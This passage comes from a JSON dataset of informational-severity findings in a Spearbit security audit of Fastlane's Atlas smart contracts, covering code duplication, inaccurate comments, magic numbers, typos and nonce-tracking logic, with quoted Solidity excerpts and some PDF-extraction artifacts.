        "body": "Function getCallChainHash() does a check with RequirePreOps. needsPreOpsCall() for easier maintainability and readability. It could also use the function function getCallChainHash(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig & 1 << uint32(CallConfigIndex.RequirePreOps) != 0) { // ... } // ... } function needsPreOpsCall(uint32 callConfig) internal pure returns (bool needsPreOps) { needsPreOps = (callConfig & 1 << uint32(CallConfigIndex.RequirePreOps) != 0); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "modifier payBids() can simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "modifier payBids() retrieves ETH for both the bid and the return of msg.value. This is not straight- forward: 98 modifier payBids(address bidToken, uint256 bidAmount) { // ... _; if (bidToken == address(0)) { // Ether balance uint256 ethOwed = bidAmount + msg.value; if (ethOwed > address(this).balance) { IWETH9(WETH_ADDRESS).withdraw(ethOwed - address(this).balance); } SafeTransferLib.safeTransferETH(msg.sender, bidAmount); } else { // ERC20 balance if (msg.value > address(this).balance) { IWETH9(WETH_ADDRESS).withdraw(msg.value - address(this).balance); } SafeTransferLib.safeTransfer(ERC20(bidToken), msg.sender, bidAmount); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Solver knows error codes of previous solvers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "key.solverOutcome and this value is passed to the next solver. It is unclear why the next solver should want to know the error code of the previous solver. Perhaps that information can somehow be abused. We would expect the solvers to be isolated. 99 function _executeSolverOperation( // ... result |= _solverOpWrapper(/*...*/ , key.pack()); key.solverOutcome = uint24(result); if (result.executionSuccessful()) { // ... return (true, key); } // ... } function _solverOpWrapper(/*...*/ , bytes32 lockBytes) /*...*/ { // ... bytes memory data = abi.encodeWithSelector(... solverMetaTryCatch.selector, /*...*/ ); data = abi.encodePacked(data, lockBytes); (success, data) = environment.call{ value: solverOp.value }(data); } function pack(EscrowKey memory self) internal pure returns (bytes32 packedKey) { packedKey = bytes32( abi.encodePacked( // ... self.solverOutcome, // ... ) ); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two different ways to represent errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are two approaches to store error information. One by storing one error in a uint256, via ValidCallsResult. The other by storing multiple errors as separate bits in a uint256, via SolverOutcome. The errors also partly overlap. This approach could be confusing and error prone. enum ValidCallsResult { Valid, GasPriceHigherThanMax, TxValueLowerThanCallValue, DAppSignatureInvalid, UserSignatureInvalid, TooManySolverOps, UserDeadlineReached, DAppDeadlineReached, ExecutionEnvEmpty, NoSolverOp, UnknownAuctioneerNotAllowed, InvalidSequence, InvalidAuctioneer, InvalidBundler, OpHashMismatch, DeadlineMismatch, InvalidControl, 100 InvalidSolverGasLimit, InvalidDAppNonce } enum SolverOutcome { // no refund (relay error or hostile user) InvalidSignature, InvalidUserHash, DeadlinePassedAlt, InvalidTo, UserOutOfGas, AlteredControl, // Partial Refund but no execution DeadlinePassed, GasPriceOverCap, InvalidSolver, PerBlockLimit, // solvers can only send one tx per block // if they sent two we wouldn InsufficientEscrow, GasPriceBelowUsers, CallValueTooHigh, // execution, with full user refund PreSolverFailed, SolverOpReverted, PostSolverFailed, IntentUnfulfilled, BidNotPaid, BalanceNotReconciled, EVMError  t be able to flag builder censorship }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Structs with limited comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Several structs have elements without comments.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Failed paymentsSuccessful might go undetected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In _allocateValue(), if the call to allocateValue() fails then key.paymentsSuccessful is kept at false, and processing continues. This value is passed to the PostOps Hook, so that hook could take action on it. However this is not used in any of the examples. The function metacall() doesn't return any information about this, so if this situation occurs it might be difficult to detect for the caller. Also this value isn't emited anywhere, so it is also difficult to track offline. function _allocateValue(/*...*/ ) /*...*/ { // ... bytes memory data = abi.encodeWithSelector(IExecutionEnvironment.allocateValue.selector, ... )); // ... (bool success,) = key.executionEnvironment.call(data); if (success) { key.paymentsSuccessful = true; } return key; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "No minimum value for ESCROW_DURATION",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The constructor of Storage doesn't enforce any limits on _escrowDuration. A too short duration might accidentally be set which will allow unbonding of AtlETH in an unexpected short period. constructor(uint256 _escrowDuration, /*...*/ ) /*...*/ { ESCROW_DURATION = _escrowDuration; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider penalizing bundlers for unused gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "For a solver to be considered successful in an Atlas transaction, they must pass a validateBal- ances() check at the end of the solverMetaTryCatch() function. This check will ensure that the Atlas deposits are larger than the Atlas claims + withdrawals, where claims is an upper-bound gas cost based on the starting gasleft(). Since a bundler can provide excess gas that will later be refunded to them, the claims value may be inflated at this point. While this unused gas is later subtracted in the _settle() function and the winning solver is reimbursed the excess ETH, this behavior implies an inefficiency. With a high initial gasleft() value, the winning solver would be required to provide otherwise unnecessary ETH which will be immediately returned to them.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Same nonce storage used for userOp.from and dAppOp.from",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The _handleNonces() function is used by both the _verifyUser() function (to invalidate the userOp.from nonce) and the _verifyDApp() function (to invalidate the dAppOp.from nonce). Regardless of the scenario, the underlying account address is treated the same in storage. So, if an address is sometimes the userOp.from value and other times the dAppOp.from value, the nonce management can be complicated. The most complex scenario would be if userOp.from == dAppOp.from in a single Atlas transaction. To allow simpler nonce management and better sequencing, using separate storage may be desirable in these edge cases.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Example code atlasSolverCall is limited",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function atlasSolverCall of SolverBase has no code for the invertsBidValue case. Function atlasSolverCall also returns exactly the bidAmount that was supplied as a parameter to atlasSolver- Call(). Although it retrieves bidBalance at the beginning of the function via modifier payBids(), it doesn't use it. modifier payBids(address bidToken, uint256 bidAmount) { // Track starting balances uint256 bidBalance = // not used bidToken == address(0) ? address(this).balance - msg.value : ERC20(bidToken).balanceOf(address(this)); _; // ... ,! }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code duplication in solverMetaTryCatch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function solverMetaTryCatch() contains some code duplication. For easier code maintenance and contract size reduction these parts could be combined. function solverMetaTryCatch(/*...*/ ) /*...*/ { // ... if (_bidFind()) { // ... if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) revert AtlasErrors.BalanceNotReconciled(); // ... revert AtlasErrors.BidFindSuccessful(netBid); } // ... if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) { revert AtlasErrors.BalanceNotReconciled(); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "withdrawSurcharge() might be done too early",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The surcharge is initialized in the constructor of Storage and increased via _settle(). Then it can be withdrawn via withdrawSurcharge(). However if this is done too early on and not enough ETH is present in the Atlas contract, then flashloans are not possible. This is not obvious. constructor(/*...*/ ) payable { // ... // Initialized with msg.value to seed flash loan liquidity surcharge = msg.value; // ... } function withdrawSurcharge() external { if (msg.sender != surchargeRecipient) { revert InvalidAccess(); } uint256 paymentAmount = surcharge; surcharge = 0; // Clear before transfer to prevent reentrancy SafeTransferLib.safeTransferETH(msg.sender, paymentAmount); emit SurchargeWithdrawn(msg.sender, paymentAmount); } function _settle(/*...*/ ) /*...*/ { // ... uint256 _surcharge = surcharge; // ... surcharge = _surcharge + netGasSurcharge; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Existence of both SURCHARGE and surcharge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "contract Storage contains both SURCHARGE and surcharge which might be confusing. contract Storage is AtlasEvents, AtlasErrors { uint256 public constant SURCHARGE = 1_000_000; // Out of 10_000_000 uint256 public surcharge; // Atlas gas surcharges }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Direct access to accessData[], _balanceOf[] and bondedTotalSupply",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Several contracts outside of AtlETH access accessData[], _balanceOf[] and bondedTotalSupply directly, however it better to hide the implementation details. The updates outside of the AtlETH don't have emit attached so for an offchain indexer it is difficult to track all AtlETH movements.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrent comment in reconcile()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The comment approvedAmount should probably be maxApprovedGasSpend. function reconcile(..., uint256 maxApprovedGasSpend) /*...*/ { // NOTE: approvedAmount is the amount of the solver // ...  s atlETH that the solver is allowing }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "validateBalances() and _checkAtlasIsUnlocked() could use isUnlocked()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "validateBalances() checks for a lock via the value of _deposits. It is safer and more readable to check this via the lock itself. _checkAtlasIsUnlocked() checks for a lock via the value UNLOCKED. It is more readable to use isUnlocked(). function validateBalances() /*...*/ { // ... // Check if locked. if (_deposits != type(uint256).max) { // ... } // ... } function isUnlocked() external view returns (bool) { return lock == UNLOCKED; } function _releaseAtlasLock() internal { // ... lock = UNLOCKED; // ... deposits = type(uint256).max; } address internal constant UNLOCKED = address(1); function _checkAtlasIsUnlocked() internal view { if (IAtlas(ATLAS).lock() != UNLOCKED) revert AtlasErrors.AtlasLockActive(); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Future authorization might fail because solver contract isn't solverOp.from",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "solverOp.from. This checked to be the owner of the contract in modifier safetyFirst(). In the template SolverBase, atlasSolverCall() is called with the first parameter being Later on reconcile() is called, which currently is unauthorized: see issue \"reconcile() can be called by anyone\". Once authorization is added to this function then it should most likely be called by the same address as solverOp.from to allow verification. Then it isn't practical that solverOp.from is the owner. function solverMetaTryCatch(/*...*/ ) /*...*/ { ,! // ... /*...*/ solverCallData = abi.encodeWithSelector(ISolverContract.atlasSolverCall.selector, solverOp.from, /*...*/ ); (success,) = solverOp.solver.call{ gas: gasLimit, value: solverOp.value }(solverCallData); // ... } function atlasSolverCall(address sender, ...) safetyFirst(sender) /*...*/ { // ... } modifier safetyFirst(address sender) { // Safety checks require(sender == _owner, \"INVALID CALLER\"); // ... IEscrow(_atlas).reconcile{ value: msg.value }(msg.sender, sender, shortfall); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Value in revert message in _settle() is not obvious",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _settle() tries to _assign() costs. If this fails then it reverts with a value that uses an updated deposits. This is not obvious when reading the code. function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); // uses updated ,! deposits } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } 109 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... uint112 amt = uint112(amount); // ... if (aData.bonded < amt) { // ... if (bData.unbonding + aData.bonded < amt) { isDeficit = true; amount = uint256(bData.unbonding + aData.bonded); // contribute less to deposits ledger // ... } else { // ... } } else { // ... } bondedTotalSupply -= amount; deposits += amount; // this updated value is used in revert message of _settle } function _credit(address owner, uint256 amount) internal { // ... bondedTotalSupply += amount; // ... // no change in withdrawals }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "_releaseSolverLock() can be run without _trySolverLock()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function _executeSolverOperation(), if _validateSolverOperation() fails (e.g. result !=0 ), then canExecute() will be false and then _trySolverLock() won't be executed. However _releaseSolverLock() is executed. With the current code this doesn't matter because it only assigns gas costs. Once suggested changes are made this could be a problem, see the issue \"Function _releaseSolver- Lock() doesn't undo all the actions of _trySolverLock()\". function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute()) { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... } // ... } _releaseSolverLock(solverOp, gasWaterMark, result, false, !prevalidated); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reverting fallback() is unnecessary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Contract Escrow contains a fallback() with a revert();. This isn't necessary because the Atlas / Escrow will also revert is no fallback() is present. Perhaps its added to prevent accidentally adding another fallback() to one of the inherited contracts. In that case a comment would be useful. abstract contract Escrow is AtlETH { fallback() external payable { revert(); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "block.timestamp or block.number",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function permit() uses deadlines based on block.timestamp, however all other deadlines are based on block.number which might be confusing. From user's perspective, they may find it easier to know the deadline in timestamp instead of block number. function permit(/*...*/ ) /*...*/ { if (deadline < block.timestamp) revert PermitDeadlineExpired(); // ... } AtlETH uses lastAccessedBlock based on block.number but _validateSolverOperation() suggest to change to timestamp. function _validateSolverOperation( // NOTE: Turn this into time stamp check for FCFS L2s? if (lastAccessedBlock == block.number) { result |= 1 << uint256(SolverOutcome.PerBlockLimit); } } For this decicion it is important to be aware that on chains like Arbitrum there can be multiple blocks within the same block.timestamp. Such a change will prevent solvers to participate in multiple blocks within the same second. The deadlines in UserOp, SolverOp and DappOp are based on block.number, however no comment is made about this in the struct definitions. function _validCalls(/*...*/ ) /*...*/ { // ... // Check if past user if (block.number > userOp.deadline) { s deadline  // ... } // Check if past dapp if (block.number > dAppOp.deadline) { s deadline  // ... } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "_validateSolverOperation() uses two different ways to return a value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _validateSolverOperation() uses two different ways to return a gasLimit with value 0. function _validateSolverOperation(/*...*/ ) /*...*/ returns (uint256, uint256 gasLimit){ if (gasWaterMark < /*...*/ ) { return (result | 1 << /*...*/ , gasLimit); // gasLimit == 0 } if (block.number > solverOp.deadline) { return ( result | 1 /*...*/ , 0 ); // gasLimit == 0 } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Difference between Sorter and Atlas functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function Sorter - _verifySolverEligibility() partly overlaps with checks in _validate- SolverOperation() and verifySolverOp(). The overlapping parts could be combined. The differences shoud be doublechecked. When called via _bidFindingIteration(): verifySolverOp() is done once (via !prevalidated) and _vali- dateSolverOperation() is done twice. Operations related to block.number stay the same so they could move to verifySolverOp() to be only executed once. Also see issue \"_handleAltOpHash() executed even in error situations\". Note: Moving the block.number checks would not be a good idea if lastAccessedBlock could be updated in the mean time. This is almost the case see issue: \"Unreachable code in _assign()\". The names of verifySolverOp() and _validateSolverOperation() are similar which could be confusing. Differences between functions: _validateSolverOperation & verifySolverOp _verifySolverEligibility check signatures check solverOp.deadline check solverOp.to != ATLAS check solverOp.solver == ATLAS ... OR solverOp.solver == address(AtlasVerification) - - - - - complicated formula for gas estimates simple formula lastAccessedBlock == block.number solverLastActiveBlock >= block.number accessData[solverOp.from].bonded balanceOfBonded() accessData[solverOp.from].lastAccessedBlock accountLastActiveBlock() 113",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some functions can be moved to AtlasVerification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_validateSolverOperation() is very similar to the validate / verify calls in AtlasVerification so they could be moved there for consistency and to free some contract size space in Atlas. Function _handleAltOpHash() is similar to _handleNonces() in AtlasVerification so it could be moved there for consistency and to free some contract size space in Atlas. The function name _handleAltOpHash() doesn't indicate it keeps track of something.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Position of revert in _getBidAmount() can be clearer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _getBidAmount() does a revert after calling _releaseSolverLock(). Althought this re- vert shouldn't happen, it might just as well be done directly after the call. The revert doesn't return an error code, adding one might increase readability. As an unusual pattern is used, it is good to add a comment. 114 function _bidFindingIteration(/*...*/ ) /*...*/ { // ... key.bidFind = true; // ... /*...*/ _getBidAmount(/*...*/ ,key) /*...*/ // ... } function _getBidAmount(/*...*/ ) /*...*/ { // ... data = abi.encodeWithSelector( /*...*/ solverMetaTryCatch.selector, /*...*/ ); // ... (success, data) = key.executionEnvironment.call{ value: solverOp.value }(data); _releaseSolverLock(solverOp, gasWaterMark, result, true, true); if (success) { revert(); } // ... } function solverMetaTryCatch( if (_bidFind()) { revert AtlasErrors.BidFindSuccessful(netBid);",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function _validateSolverOperation() doesn't need parameter result",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In both _executeSolverOperation() and _getBidAmount() it is verified that result==0 before call- ing _validateSolverOperation(). So result doesn't have to be supplied to _validateSolverOperation(). Note: return (result |= 1 ...); doesn't require the = because the updated result isn't used after the return. 115 function _executeSolverOperation( if (result.canExecute()) { // ... (result, gasLimit) = _validateSolverOperation(/*...*/ , result); } // ... } function _getBidAmount( // ... if (!result.canExecute()) return 0; (result, gasLimit) = _validateSolverOperation(..., result); // ... } function _validateSolverOperation(..., if (/*...*/ ) { uint256 result) /*...*/ { return (result | 1 << uint256(SolverOutcome.UserOutOfGas), gasLimit); } if (/*...*/ ) { return (result | 1 << uint256(dConfig.callConfig.allowsTrustedOpHash() ? uint256(SolverOutcome.DeadlinePassedAlt) : uint256(SolverOutcome.DeadlinePassed) ), ,! 0 ); } if (/*...*/ ) { return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); } if (lastAccessedBlock == block.number) { result |= 1 << uint256(SolverOutcome.PerBlockLimit); } if (gasCost > solverBalance) { result |= 1 << uint256(SolverOutcome.InsufficientEscrow); } return (result, gasLimit); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are typos in the following locations:  Escrow.sol#L86: SovlerOperation ! SolverOperation. /// @notice Attempts to execute a SovlerOperation and determine if it wins the auction.  GasAccounting.sol#L219-L220: SovlerOperation ! SolverOperation /// @dev Calculates the gas used for the SovlerOperation and adjusts the solver s escrow balance  ,! accordingly. /// @param solverOp The current SovlerOperation for which to account  DAppIntegration.sol#L36: arent ! aren't 116 // processed in any order so long as they arent duplicated and  EscrowBits.sol#L68: is ! if // returns true is solver doesn  t get to bypass the refund.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Store \"magic numbers\" as constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are magic numbers used throughout the codebase, which can make the code harder to understand compared to using constant variables. Some usages of magic numbers include:  AtlasVerification.sol#L550: IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0;  GasAccounting.sol#L238: uint256 gasUsed = (gasWaterMark - gasleft() + 5000) * tx.gasprice;  GasAccounting.sol#L244: gasUsed = (gasUsed + ((gasUsed * SURCHARGE) / 10_000_000));  GasAccounting.sol#L273: gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000);  GasAccounting.sol#L289: uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000;  Escrow.sol#L269-L270: gasLimit = (100) * (solverOp.gas < dConfig.solverGasLimit ? solverOp.gas : ,! dConfig.solverGasLimit) / (100 + _SOLVER_GAS_BUFFER) + _FASTLANE_GAS_BUFFER;  SafetyLocks.sol#L42: claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000);  Storage.sol#L58-L59: uint256 internal _solverCalledBack = 1 << 161; uint256 internal _solverFulfilled = 1 << 162;  AtlasVerification.sol#L409-L410: uint256 bitmapIndex = ((nonce - 1) / 240) + 1; // +1 because highestFullBitmap initializes at 0 uint256 bitmapNonce = ((nonce - 1) % 240); // 1 -> 0, 240 -> 239. Needed for shifts in bitmap.  Atlas.sol#L51: 117 uint256 gasMarker = gasleft(); // + 21_000 + (msg.data.length * _CALLDATA_LENGTH_PREMIUM);  Escrow.sol#L448: if (success) { return uint256(0); }  EscrowBits.sol#L48-L61: return (result == 0);  Simulator.sol#L91: return (false, Result.Unknown, uint256(type(SolverOutcome).max) + 1);  Storage.sol#L84-L86: claims = type(uint256).max; withdrawals = type(uint256).max; deposits = type(uint256).max;  SafetyLocks.sol#L93-L95: claims = type(uint256).max; withdrawals = type(uint256).max; deposits = type(uint256).max;  GasAccounting.sol#L34: if (_deposits != type(uint256).max) {  GasAccounting.sol#L166: if (amount > type(uint112).max) revert ValueTooLarge();  GasAccounting.sol#L214: if (amount > type(uint112).max) revert ValueTooLarge();  AtlETH.sol#L111: if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;  AtlasVerification.sol#L387: if (nonce > type(uint128).max - 1) {  CallBits.sol#L103-L181: sequenced = (callConfig & 1 << uint32(CallConfigIndex.UserNoncesSequenced) != 0); // ... return (callConfig & 1 << uint32(CallConfigIndex.ExPostBids) != 0);",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Do safety checks as early as possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Safety checks should be done as early as possible. It makes it easy to remove certain assumptions when going through the code, and improves readability.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider allowing arbitrary calls from the ExecutionEnvironment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Although the ExecutionEnvironment is somewhat similar to a smart contract wallet, its non-Atlas functionality is limited to the withdrawERC20() and withdrawEther() functions. Technically the Atlas functions (e.g. userWrapper()) can execute arbitrary logic, however, this would depend on how the relevant DAppControl guards these calls. In niche situations, more functionality may be desired by users. For example, if an ExecutionEnvironment be- comes eligible for an airdrop, it may not be possible to claim the airdrop with any of the existing functions.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "bypassSignatoryApproval isn't clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The use of bypassSignatoryApproval is not easy to understand: bypassSignatoryApproval is used when the DappControl doesn't want/have to verify the signer of the dAppOp e.g. if the DappControl isn't the responsible party. /// @return bypassSignatoryApproval A boolean indicating if the signatory approval check should be ,! function _verifyAuctioneer(/*...*/ ) /*...*/ returns (/*...*/ , bool bypassSignatoryApproval) { bypassed. // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Bool return value looses error information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function below all return different types of data, but all want to expose error codes. _verify- DApp() and _verifyUser() only return bool which looses information about the error. Functions _verifyAuc- tioneer() that return both a bool an and error. The error would be sufficient. (/*...*/ ) /*...*/ returns (bool /*valid*/ , ValidCallsResult) { } function _verifyDApp (/*...*/ ) /*...*/ returns (bool /*valid*/ ) { } function _verifyUser function _verifyAuctioneer(/*...*/ ) /*...*/ returns (bool valid, bool bypassSignatoryApproval) { }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate comment of _nonceUsedInBitmap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The relevant values for the nonce parameter of _nonceUsedInBitmap() are 0 - 239 as can be seen in function _handleNonces(). So the comment of _nonceUsedInBitmap() isn't accurate. /// @dev Only accurate for nonces 1 - 240 within a 256-bit bitmap. // ... function _nonceUsedInBitmap(uint256 bitmap, uint256 nonce) internal pure returns (bool) { return (bitmap & (1 << nonce)) != 0; } function _handleNonces(address account, uint256 nonce, bool async, bool isSimulation) internal returns ,! (bool) { // ... uint256 bitmapNonce = ((nonce - 1) % 240); // // ... if (_nonceUsedInBitmap(bitmap, bitmapNonce)) { 0 <= bitmapNonce <= 239 // ... } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "manuallyUpdateNonceTracker() can miss blocks that are not completely filled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function manuallyUpdateNonceTracker() steps forward 10 positions and then searches back- wards for the first FULL_BITMAP and stops when it finds one. However there might be intermediate block that are not completely filled. This deviates from the rest of the logic and would break invariants. function manuallyUpdateNonceTracker(address account) external { // ... // Checks the next 10 bitmaps for a higher full bitmap uint128 nonceIndexToCheck = nonceTracker.highestFullAsyncBitmap + 10; for (; nonceIndexToCheck > nonceTracker.highestFullAsyncBitmap; nonceIndexToCheck--) { bytes32 bitmapKey = keccak256(abi.encode(account, nonceIndexToCheck)); nonceBitmap = nonceBitmaps[bitmapKey]; if (nonceBitmap.bitmap == FULL_BITMAP) { nonceTracker.highestFullAsyncBitmap = nonceIndexToCheck; break; } } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function name manuallyUpdateNonceTracker() not clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function manuallyUpdateNonceTracker() only works for async (bitmap) nonces and not for se- quential nonces. This isn't clear from the function name. function manuallyUpdateNonceTracker(address account) external { // ... uint128 nonceIndexToCheck = nonceTracker.highestFullAsyncBitmap + 10; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment in Mimic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "This comment hints that user can just use an EOA with Atlas: 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB is standin for the user s EOA address  User can also have a smart contract account which works well with Atlas.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
